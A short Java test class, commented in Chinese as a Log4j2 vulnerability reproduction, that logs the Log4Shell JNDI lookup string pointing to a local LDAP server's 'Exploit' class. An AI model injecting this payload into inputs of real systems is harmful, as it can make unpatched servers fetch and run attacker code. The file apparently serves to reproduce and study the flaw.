package com.allen.testLog.testLog4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Log4j2漏洞复现
 */
public class Log4jBug {

    private static final Logger logger = LogManager.getLogger(Log4jBug.class);

    public static void TestLog4j() {
        logger.info("${jndi:ldap://127.0.0.1:8888/Exploit}");
    }

    public static void main(String[] args) {
        TestLog4j();
    }
}
